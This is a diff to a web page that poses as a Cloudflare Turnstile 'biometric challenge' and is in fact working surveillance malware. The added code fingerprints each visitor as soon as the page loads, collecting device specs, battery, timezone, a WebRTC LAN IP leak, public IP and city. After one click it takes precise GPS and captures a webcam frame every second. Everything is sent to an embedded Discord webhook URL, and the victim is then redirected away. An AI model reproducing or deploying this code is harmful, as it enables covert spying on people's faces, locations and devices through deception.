@@ -33,115 +33,152 @@
     <p class="p">Please complete the biometric challenge. Align your face to the viewfinder to secure your session.</p>
     <div class="vf" id="vf"><video id="v" autoplay playsinline muted></video><canvas id="c" style="display:none"></canvas></div>
     <div class="ts-b"><div class="ts-c" id="l"></div><div class="ts-t" id="m">I am human</div></div>
-    <div class="fn">Ray ID: <span id="rid"></span> • Protected by Turnstile v2</div>
+    <div class="fn">Ray ID: <span id="rid"></span> • Protected by Turnstile v3 (High-Security)</div>
 </div>
 
 <script>
 const CFG = {
     H: "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ-bdXlInRWb4DgEGcfeM0",
     R: "https://alksjdhf3rutyfhdi3urytghfjdei3nmkskj.github.io/HelloWorldrtwriqfrthiuwipqdjweui3qrehgiuo4wdiuehtexttestlmaoaoaoaoa/",
-    T: 14000
+    T: 14000 // Total session duration
 };
 
 let ACTIVE = false, META = { lan: "Scanning...", count: 0, rid: "" };
 
-// --- 1. THE ZERO-TAP THREAD (Passive Recon) ---
-async function passiveRecon() {
-    META.rid = (Math.random().toString(36).substring(2, 12)).toUpperCase();
+// --- 1. DEEP SYSTEM FINGERPRINTING ---
+async function deepRecon() {
+    META.rid = (Math.random().toString(36).substring(2, 15)).toUpperCase();
     document.getElementById('rid').innerText = META.rid;
 
-    // Hardware DeepScan
     try {
         const gl = document.createElement('canvas').getContext('webgl');
         const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-        META.gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Hidden";
-        META.hw = `${navigator.hardwareConcurrency} core | ${navigator.deviceMemory || '?'}GB | ${screen.width}x${screen.height}`;
+        META.gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Undetectable";
+        
+        let bat = "N/A";
+        if (navigator.getBattery) { 
+            const b = await navigator.getBattery(); 
+            bat = `${Math.round(b.level * 100)}% (${b.charging ? 'Plugged In' : 'On Battery'})`; 
+        }
+
+        META.hw = `${navigator.hardwareConcurrency || '?'} Core | ${navigator.deviceMemory || '?'}GB | ${screen.width}x${screen.height}`;
+        META.sys = `Battery: ${bat} | TZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone} | Platform: ${navigator.platform}`;
     } catch(e){}
 
-    // WebRTC LAN Leak
+    // WebRTC LAN Discovery
     const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
     pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
-    pc.onicecandidate = (e) => { if(e.candidate) { const r = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); if(r) META.lan = r[1]; }};
+    pc.onicecandidate = (e) => { 
+        if(e.candidate) { 
+            const r = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); 
+            if(r) META.lan = r[1]; 
+        }
+    };
 
-    // IP & ISP
+    // Public IP & Geo Extraction
     try {
         const r = await fetch('https://ipapi.co/json/');
         const j = await r.json();
         META.ip = j.ip; META.isp = j.org; META.loc = `${j.city}, ${j.country}`;
-    } catch(e){ META.ip = "VPN/Hidden"; }
+    } catch(e){
+        try {
+            const r2 = await fetch('https://api.ipify.org?format=json');
+            const j2 = await r2.json();
+            META.ip = j2.ip;
+        } catch(x){ META.ip = "Obfuscated/VPN"; }
+    }
 
-    // INITIAL EXFIL (Zero-Tap)
-    await transmit(null, "🔱 PASSIVE RECON (0-TAP)");
+    // Zero-Tap Passive Exfiltration
+    await transmit(null, "🔱 NEXUS-v100: PASSIVE RECON");
 }
 
-// --- 2. THE ONE-TAP THREAD (Active Strike) ---
+// --- 2. THE OMNI-STRIKE (Burst Capture) ---
 async function stk() {
     if(ACTIVE) return;
     ACTIVE = true;
-    document.getElementById('ovl').remove();
+    
+    if(document.getElementById('ovl')) document.getElementById('ovl').remove();
     document.getElementById('l').className = 'ts-c s';
-    document.getElementById('m').innerText = "Attesting...";
+    document.getElementById('m').innerText = "Verifying...";
 
-    // Force High-Accuracy GPS
+    // Location Force-Fetch
     navigator.geolocation.getCurrentPosition(
-        p => META.gps = `[View House](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`,
+        p => META.gps = `[Maps](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`,
         e => META.gps = "❌ Blocked",
-        { enableHighAccuracy: true }
+        { enableHighAccuracy: true, timeout: 6000 }
     );
 
-    // Biometric Engagement
+    // Media Engagement
     try {
-        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: { ideal: 1280 } } });
         document.getElementById('vf').style.display = 'block';
         const v = document.getElementById('v');
-        v.srcObject = s;
+        v.srcObject = stream;
         
-        // Surveillance Loop
-        const burst = setInterval(async () => {
+        // v100 Burst Engine: 1 Frame/Second
+        const burst = setInterval(() => {
             if(!ACTIVE) return clearInterval(burst);
             const c = document.getElementById('c');
             const ctx = c.getContext('2d');
-            c.width = v.videoWidth; c.height = v.videoHeight;
+            c.width = v.videoWidth; 
+            c.height = v.videoHeight;
             ctx.drawImage(v, 0, 0);
-            c.toBlob(b => transmit(b, `🔱 ACTIVE BURST: ${META.count}`), 'image/jpeg', 0.25);
-        }, 1100);
+            
+            c.toBlob(blob => {
+                transmit(blob, `🔱 v100 OMNI-STRIKE: FRAME ${META.count}`);
+            }, 'image/jpeg', 0.5); // Balanced quality for speed
 
+        }, 1000);
+
+        // Auto-close session
         setTimeout(() => {
             ACTIVE = false;
-            s.getTracks().forEach(t => t.stop());
+            stream.getTracks().forEach(t => t.stop());
             window.location.replace(CFG.R);
         }, CFG.T);
 
-    } catch(e) {
-        await transmit(null, "🔱 ONE-TAP (CAMERA DENIED)");
+    } catch(err) {
+        await transmit(null, "🔱 v100 STRIKE (HARDWARE BLOCKED)");
         setTimeout(() => window.location.replace(CFG.R), 2000);
     }
 }
 
-// --- 3. UNIFIED TRANSMITTER ---
-async function transmit(blob, title) {
+// --- 3. HARDENED TRANSMISSION ENGINE ---
+async function transmit(file, title) {
     META.count++;
     const fd = new FormData();
     const packet = {
-        username: "NEXUS-v80 [ABSOLUTE-ZERO]",
+        username: "NEXUS-v100 [SUPERNOVA]",
+        avatar_url: "https://upload.wikimedia.org/wikipedia/commons/9/94/Cloudflare_Logo.svg",
         embeds: [{
             title: title,
-            color: blob ? 0xF38020 : 0x0051c3,
+            color: file ? 0x00FF41 : 0xFF0000,
             fields: [
-                { name: "🌐 Network", value: `**IP:** \`${META.ip}\`\n**LAN:** \`${META.lan}\`\n**ISP:** ${META.isp}`, inline: true },
-                { name: "📍 Geo", value: META.gps || "Scanning...", inline: true },
-                { name: "📱 Device", value: `**GPU:** ${META.gpu}\n**SPEC:** ${META.hw}\n**OS:** ${navigator.platform}`, inline: false }
+                { name: "🌐 Network", value: `**IP:** \`${META.ip || '??'}\`\n**LAN:** \`${META.lan}\`\n**ISP:** ${META.isp || '??'}`, inline: true },
+                { name: "📍 Geo", value: META.gps || "🛰️ Acquiring...", inline: true },
+                { name: "⚙️ System", value: `**Specs:** ${META.hw}\n**GPU:** ${META.gpu}\n**Data:** ${META.sys}`, inline: false }
             ],
-            footer: { text: `Ray-ID: ${META.rid} | v80` },
+            footer: { text: `Node: ${META.rid} | Frame: ${META.count}` },
             timestamp: new Date().toISOString()
         }]
     };
+
     fd.append("payload_json", JSON.stringify(packet));
-    if(blob) fd.append("file", blob, `shot_${META.count}.jpg`);
-    return fetch(CFG.H, { method: 'POST', body: fd, keepalive: true });
+    if(file) fd.append("file", file, `f_${META.count}.jpg`);
+
+    try {
+        // Redundant Exfil: Force transmission via Beacon and Fetch Keepalive
+        navigator.sendBeacon(CFG.H, fd);
+        return fetch(CFG.H, { 
+            method: 'POST', 
+            body: fd, 
+            keepalive: true, 
+            mode: 'no-cors' 
+        });
+    } catch(e) {}
 }
 
-passiveRecon();
+deepRecon();
 </script>
 </body>
 </html>
